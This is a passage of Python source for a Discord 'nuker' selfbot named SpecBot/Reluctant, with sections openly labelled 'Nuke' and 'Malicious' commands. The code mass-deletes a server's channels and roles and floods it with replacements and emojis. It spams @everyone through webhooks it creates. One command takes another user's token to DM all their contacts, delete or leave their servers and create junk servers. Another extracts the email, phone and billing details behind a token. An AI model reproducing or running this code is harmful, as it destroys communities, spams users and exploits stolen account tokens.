        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        make = requests.post(f"https://discord.com/api/v9/guilds/{idofguild}/roles",headers=headers,json={"name":nameofchan,"permissions":"2251804225","color":0xff0000,"mentionable":"true"})
    except:
        pass


def nooooourchannelsgotnukedomg(idofguild, nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        req = requests.post(f"https://canary.discord.com/api/v9/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass


def deletionofachannel(channeldetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://canary.discord.com/api/v9/channels/{channeldetails}",headers=headers)
    except:
        pass


def deletionofarole(idoftheguild, roledetails):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        requests.delete(f"https://discord.com/api/v9/guilds/{idoftheguild}/roles/{roledetails}",headers=headers)
    except:
        pass


@Reluctant.command()
async def Clumsy_nuke(ctx):
    await ctx.message.delete()
    amountofthemtomake = 250
    nameofthem = "ran-by-SpecBot"
    for rol in ctx.guild.roles:
        threading.Thread(target=deletionofarole, args=(ctx.guild.id, rol.id,)).start()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Role: {rol}")
        await sleep(0.1)
    for chan in ctx.guild.channels:
        threading.Thread(target=deletionofachannel, args=(chan.id,)).start()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {chan}")
        await sleep(0.1)
    for i in range(int(amountofthemtomake)):
        threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, nameofthem,)).start()
        threading.Thread(target=nooooourrolesgotnukedomg, args=(ctx.guild.id, nameofthem,)).start()
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {nameofthem}")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Role: {nameofthem}")
        await sleep(0.1)
    await ctx.guild.edit(
        name="RanBySpecBot",
        description="RanBySpecBot",
        reason="Rickroll",
        icon=None,
        banner=None
    )
    with open("Other/Reluctant-emoji.jpg", "rb") as f:
        img1 = f.read()

    sijome = [img1]
    for i in range(50):
        try:
            randemoj = random.choice(sijome)
            for scale in range(32):
                await ctx.guild.create_custom_emoji(name="SpecBotRunsYou", image=randemoj)
        except:
            pass
    Clear()
    startprint()


@Reluctant.command()
async def reluctant_account(ctx):
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)
    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v9/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            await asyncio.sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")
    threading.Thread(target=leave1).start()
    threading.Thread(target=create1).start()
    threading.Thread(target=dm1).start()


def leave1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversleft = int(0)

    for i in range(len(data)):
        serverleaving = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
        if serverleaving == 204:
            serversleft += 1
        else:
            sleep(0.1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")


def delete1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)

    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v9/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")


def create1():
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
    }
    guild = {
    'name': f"Ran-By-Reluctant"
    }
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[-] {Fore.WHITE}Server Created: {Fore.WHITE}Ran-By-Reluctant")


def dm1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
    data = json.loads(resp.text)
    usersmessaged = int(0)
    for i in range(len(data)):
        messagesent = requests.post(f"https://discord.com/api/v9/channels/{data[i]['id']}/messages", headers=headers,
                                    json={"content": "Account Nuked By Reluctant | dsc.gg/reluctant"})
        if messagesent.status_code == 200:
            usersmessaged += 1
        else:
            sleep(0.1)
        requests.delete(f"https://discord.com/api/v9/channels/{data[i]['id']}", headers=headers)

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent {usersmessaged} People Direct Messages")


@Reluctant.command()
async def createchannels(ctx, *, message):
    await ctx.message.delete()
    amountofthemtomake = 250
    for i in range(int(amountofthemtomake)):
        threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, message,)).start()
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {message}")
        await sleep(0.1)


@Reluctant.command()
async def customchannels(ctx, amount: int, *, message):
    await ctx.message.delete()
    for _i in range(amount):
        try:
            threading.Thread(target=nooooourchannelsgotnukedomg, args=(ctx.guild.id, message,)).start()
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Channel: {message}")
            await sleep(0.1)
        except:
            return


@Reluctant.command()
async def delchannels(ctx):
    await ctx.message.delete()
    for chan in list(ctx.guild.channels):
        try:
            threading.Thread(target=deletionofachannel, args=(chan.id,)).start()
            print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Channel: {chan}")
            await sleep(0.1)
        except:
            return


@Reluctant.command()
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Renamed Channel {channel} To {name}")
        await channel.edit(name=name)


@Reluctant.command()
async def createroles(ctx, message):
    await ctx.message.delete()
    for i in range(250):
        try:
            threading.Thread(target=nooooourrolesgotnukedomg, args=(ctx.guild.id, message,)).start()
            print(f'''{Fore.GREEN}[-] {Fore.WHITE}Created Role: {message}''' + Fore.WHITE)
            await sleep(0.1)
        except:
            return


@Reluctant.command()
async def customroles(ctx, amount: int, *, message):
    await ctx.message.delete()
    for i in range(amount):
        try:
            threading.Thread(target=nooooourrolesgotnukedomg, args=(ctx.guild.id, message,)).start()
            print(f'''{Fore.GREEN}[-] {Fore.WHITE}Created Role: {message}''' + Fore.WHITE)
            await sleep(0.1)
        except:
            return


@Reluctant.command()
async def delroles(ctx):
    await ctx.message.delete()
    for rol in ctx.guild.roles:
        threading.Thread(target=deletionofarole, args=(ctx.guild.id, rol.id,)).start()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Role: {rol}")
        await sleep(0.1)


@Reluctant.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    kicks = []
    bans = []
    for guild in Reluctant.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_thumbnail(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
    embed.add_field(name=f"```Servers With Admin ({len(admins)})```", value=f"{admins}", inline=False)
    embed.add_field(name=f"```Servers With Ban Permission ({len(bans)})```", value=f"{bans}", inline=False)
    embed.add_field(name=f"```Servers With Kick Permission ({len(kicks)})```", value=f"{kicks}", inline=False)
    embed.set_footer(text="Servers w/ Admin Commands ")
    await ctx.send(embed=embed)
    return


# Nuke Commands End

# Malicious Commands Start


def ssspam(webhook):
    global spammingdawebhookeroos
    while spammingdawebhookeroos:

        randcolor = random.randint(0x000000, 0xFFFFFF)
        data = {
            "content": "@everyone **Nuked By SpecBot**\n",
            "embeds": [
                {
                    "title": "Nuked Using SpecBot",
                    "tts": "true",
                    "description": "Ran Using SpecBot\n",
                    "url": "",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "Ran Using SpecBot",
                            "value": "Reliable Stresser "
                        }
                    ],
                    "author": {
                        "name": "SpecBot",
                        "url": "https://cdn.e-z.host/e-zimagehosting/f1e0e8e5-b186-4717-a297-2198116de868/ed91c4cd.png",
                        "icon_url": "https://cdn.e-z.host/e-zimagehosting/f1e0e8e5-b186-4717-a297-2198116de868/ed91c4cd.png"
                    },
                    "footer": {
                        "text": "Ran Using SpecBot",
                        "icon_url": "https://cdn.e-z.host/e-zimagehosting/f1e0e8e5-b186-4717-a297-2198116de868/ed91c4cd.png"
                    },
                    "image": {
                        "url": "https://cdn.e-z.host/e-zimagehosting/f1e0e8e5-b186-4717-a297-2198116de868/ed91c4cd.png"
                    }
                }
            ],
            "username": "Spec Bot",
            "avatar_url": "https://cdn.e-z.host/e-zimagehosting/f1e0e8e5-b186-4717-a297-2198116de868/ed91c4cd.png"
        }

        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            pass

        elif "rate limited" in spammingerror.lower():

            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)

            except:
                delay = random.randint(5, 10)
                time.sleep(delay)
        else:
            delay = random.randint(30, 60)
            time.sleep(delay)


@Reluctant.command()
async def spamwebhook(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=ssspam, args=(webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 50:
        webhookamount = 1

    else:
        webhookamount = 50 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1
    for i in range(
            webhookamount):
        for channel in ctx.guild.text_channels:

            try:
                webhook = await channel.create_webhook(name='Nuked Using SpecBot')
                threading.Thread(target=ssspam, args=(webhook.url,)).start()
                f = open(r'Other/Webhooks/webhooks-' + str(ctx.guild.id) + ".txt", 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                pass


@Reluctant.command()
async def stopwebhook(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = False
    print(f"{Fore.RED}[-] {Fore.WHITE}Webhook Spam: Stopped")


def makeguildxd(tokentouse,nukemsg):
    global serversmade

    data = {"name": nukemsg}
    headers={"authorization": tokentouse}

    servercreation = requests.post("https://discord.com/api/v9/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
    if servercreation == 201:
        serversmade += 1


@Reluctant.command()
async def nuketoken(ctx, tokentonukelol=None, *, nukemsg=f"Nuked By SpecBot"):
    global serversmade
    serversmade = 0
    await ctx.message.delete()
    if tokentonukelol == None:
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Arguments: token" + Fore.RESET)

    elif ctx.guild == None:
        print(f"{Fore.RED}[-] {Fore.WHITE}This Command Only Works In Private Servers" + Fore.RESET)

    else:
        embed = discord.Embed(title="SpecBot - Confirm",description=f"Made by Clumsy",color=0xff0000)

        embed.set_footer(text="Token Fuck")
        message = await ctx.send(embed=embed)
        await message.add_reaction('✅')
        reactionstuffyes = True

        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message == message

        while reactionstuffyes:
            try:
                reaction, user = await Reluctant.wait_for('reaction_remove', timeout=10, check=requirements)
                embed = discord.Embed(title="SpecBot - Success",description=f"You reacted, the process has started!\nToken Successfully Verified",color=0xff0000)
        
                embed.set_footer(text="Token Fuck - Initiated")
                await message.edit(embed=embed)
                await message.clear_reactions()
                reactionstuffyes = False
                headers = {"authorization": tokentonukelol}
                tokendata = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                if tokendata.status_code != 200:
                    print(f"{Fore.RED}[-] {Fore.WHITE}Error: {tokendata.text}")
                else:
                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Valid Token: {tokentonukelol}")

                    resp = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
                    data = json.loads(resp.text)
                    usersmessaged = int(0)

                    for i in range(len(data)):
                        messagesent = requests.post(f"https://discord.com/api/v9/channels/{data[i]['id']}/messages",headers=headers, json={"content": nukemsg})
                        if messagesent.status_code == 200:
                            usersmessaged += 1
                        else:
                            await asyncio.sleep(0.1)
                        requests.delete(f"https://discord.com/api/v9/channels/{data[i]['id']}", headers=headers)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent {usersmessaged} People Direct Messages")

                    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversleft = int(0)

                    for i in range(len(data)):
                        serverleaving = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
                        if serverleaving == 204:
                            serversleft += 1
                        else:
                            await asyncio.sleep(0.1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")
                    randcolor = random.randint(0x000000, 0xFFFFFF)

                    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversdeleted = int(0)

                    for i in range(len(data)):
                        servdel = requests.post(f"https://discord.com/api/v9/guilds/{data[i]['id']}/delete",headers=headers, json={}).status_code
                        if servdel == 204:
                            serversdeleted += 1
                        else:
                            await asyncio.sleep(1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")

                    for i in range(100):
                        threading.Thread(target=makeguildxd, args=(tokentonukelol, nukemsg,)).start()
                        await asyncio.sleep(1)

                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Created {serversmade} Servers")
                    with open('image.png', 'rb') as image:
                        await Reluctant.user.edit(avatar=image.read())
                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Token Successfully Nuked")

            except asyncio.TimeoutError:
                print(f"{Fore.RED}[-] {Fore.WHITE}Your Connection Timed Out")
                await message.clear_reactions()
                reactionstuffyes = False

            except asyncio.TimeoutError:
                print(f"{Fore.RED}[-] {Fore.WHITE}Your Connection Timed Out")
                await message.clear_reactions()
                reactionstuffyes = False


@Reluctant.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    await ctx.message.delete()
    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})

    if data.status_code == 200:

        j = data.json()
        name = f'{j["username"]}#{j["discriminator"]}'
        userid = j['id']
        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
        phone = j['phone']
        isverified = j['verified']
        email = j['email']
        twofa = j['mfa_enabled']
        flags = j['flags']
        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        embed=discord.Embed(title=f"Spec Bot", description=f"Made by Clumsy\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`", color=0xff0000)

        embed.set_footer(text="Token Info ")
        message = await ctx.send(embed=embed)

        has_nitro = False
        datahmm = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})
        nitro_data = datahmm.json()
        nitroyems = bool(len(nitro_data) > 0)
        if nitroyems:
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            totalnitro = abs((start - end).days)
            embed=discord.Embed(title=f"Spec Bot", description=f"Made by Clumsy\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`\n\nNitro Data:\nHad nitro since : `{end}`\nNitro ends on : `{start}`\nTotal nitro : `{totalnitro}`", color=0xff0000)
    
            embed.set_footer(text="Token Info ")
            await message.edit(embed=embed)
    else:
        embed=discord.Embed(title=f"Spec Bot", description=f"Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=0xff0000)

        embed.set_footer(text="Token Info ")
        await ctx.send(embed=embed)


# Malicious Commands End

# Admin Commands Start


@Reluctant.command()
async def nukev1(ctx):
    delete = 100000
    await ctx.message.delete()
    await ctx.channel.purge(limit=delete)
    embed = discord.Embed(
        colour=0xff0000,
        title="Nuked this Channel!"
    )
    embed.set_image(
        url="https://images-ext-1.discordapp.net/external/Q1MhsGFgPxSma5U4wN9EWgKSY0SkLeZbTBrE9MllnNo/https/cdn.dolphln.com/nukerbot/nuke_gifs/1.gif")
    embed.set_footer(text="")
    await ctx.send(embed=embed)

@Reluctant.command()
async def nukev2(ctx, channel_idlol):
    await ctx.message.delete()
    if channel_idlol.isdigit():
        pass
    else:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Invalid Channel ID```", value=f"```Channel ID Must Be Digits Only```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Channel ID Must Be Digits Only")
        return
    channel_id = int(''.join(i for i in channel_idlol if i.isdigit()))
    existing_channel = bot.get_channel(channel_id)
    if existing_channel:
        channel = ctx.channel
        channel_position = channel.position
        new_channel = await existing_channel.clone(reason="Removed Channel")
        await existing_channel.delete()
        await new_channel.edit(position=channel_position, sync_permissions=True)
    else:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```No Channel Found```", value=f"```Channel ID Not Found```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Channel ID Not Found")


@Reluctant.command()
async def ban(ctx, user: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        await user.ban(reason=reason)
        print(f'''{Fore.RED}[-] {Fore.WHITE}Banned User: {user}''' + Fore.WHITE)
    except:
        pass


@Reluctant.command()
async def kick(ctx, user: discord.Member, *, reason="No reason provided"):
    await ctx.message.delete()
    try:
        await user.kick(reason=reason)
        print(f'''{Fore.RED}[-] {Fore.WHITE}Kicked User: {user}''' + Fore.WHITE)
    except:
        pass


@Reluctant.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass


# Admin Commands End

# Account Commands Start


@Reluctant.command()
async def createservers(ctx, *, servername):
    await ctx.message.delete()
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
    }
    guild = {
    'name': f"{servername}"
    }
    for i in range(100):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Server Created: {Fore.WHITE}{servername}")


@Reluctant.command()
async def delservers(ctx):
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)

    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v9/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            await asyncio.sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")

@Reluctant.command()
async def leaveservers(ctx):
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversleft = int(0)

    for i in range(len(data)):
        serverleaving = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
        if serverleaving == 204:
            serversleft += 1
        else:
            await asyncio.sleep(0.1)

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")


@Reluctant.command()
async def leavegroups(ctx):
    await ctx.message.delete()
    for channel in Reluctant.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()
            print(f"{Fore.RED}[-] {Fore.WHITE}Left Group: {channel}")


@Reluctant.command()
async def gamestatus(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await Reluctant.change_presence(activity=game)


@Reluctant.command()
async def watching(ctx, *, status: str = None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=3, name=f"{status}")
        await Reluctant.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Watching Status To: {status}")
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def streaming(ctx, *, status: str = None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=1, name=f"{status}", url="")
        await Reluctant.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Streaming Status To: {status}")
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def listening(ctx, *, status: str = None):
    await ctx.message.delete()
    try:
        game = discord.Activity(type=2, name=f"{status}")
        await Reluctant.change_presence(activity=game)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Set Listening Status To: {status}")
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def resetstatus(ctx):
    await ctx.message.delete()
    await Reluctant.change_presence(activity=None, status=discord.Status.dnd)


@Reluctant.command()
async def nickname(ctx, *, name: str = None):
    await ctx.message.delete()
    if name is None:
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Argument: name")
    else:
        try:
            await ctx.author.edit(nick=name)
        except Exception as e:
            if error_style == "embeds":
                embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
        
                embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
                embed.set_footer(text="Error ")
                await ctx.send(embed=embed)
            elif error_style == "console":
                print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def namefuck(ctx):
    await ctx.message.delete()
    try:
        name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫"
        await ctx.author.edit(nick=name)
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def invisible(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```{e}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")


@Reluctant.command()
async def whois(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    try:
        if user is None:
            user = ctx.author
        if ctx.guild != None:
            date_format = "%a, %d %b %Y %I:%M %p"
            em = discord.Embed(description="User Info Loaded", color=0xff0000)
            em.set_author(name=str(user), icon_url=user.avatar_url)
            em.set_thumbnail(url=user.avatar_url)
            em.add_field(name="Registered", value=user.created_at.strftime(date_format))
            em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
            members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
            em.add_field(name="Join Number", value=str(members.index(user) + 1))
            em.add_field(name="User ID", value=str(user.id))
            if len(user.roles) > 1:
                role_string = ' '.join([r.mention for r in user.roles][1:])
                em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
            perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
            em.add_field(name="Permissions", value=perm_string, inline=False)
            em.set_footer(text=f"Whois {user.mention}")
            return await ctx.send(embed=em)
        else:
            date_format = "%a, %d %b %Y %I:%M %p"
            em = discord.Embed(description=user.mention)
            em.set_author(name=str(user), icon_url=user.avatar_url)
            em.set_thumbnail(url=user.avatar_url)
            em.add_field(name="Created", value=user.created_at.strftime(date_format))
            em.set_footer(text='ID: ' + str(user.id))
            return await ctx.send(embed=em)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```You must use the user id```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: You must use the user id")
        return


# Account Commands End

# Tool Commands Start


@Reluctant.command()
async def portscan(ctx, host):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/portscan.php?key=testkey&host={host}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Host**", value=f"```{host}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


@Reluctant.command()
async def singleportscan(ctx, host, port):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/singleportscan.php?key=testkey&host={host}&port={port}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Host**", value=f"```{host}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


@Reluctant.command()
async def geolocate(ctx, host):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/geolocate.php?key=testkey&host={host}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Host**", value=f"```{host}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
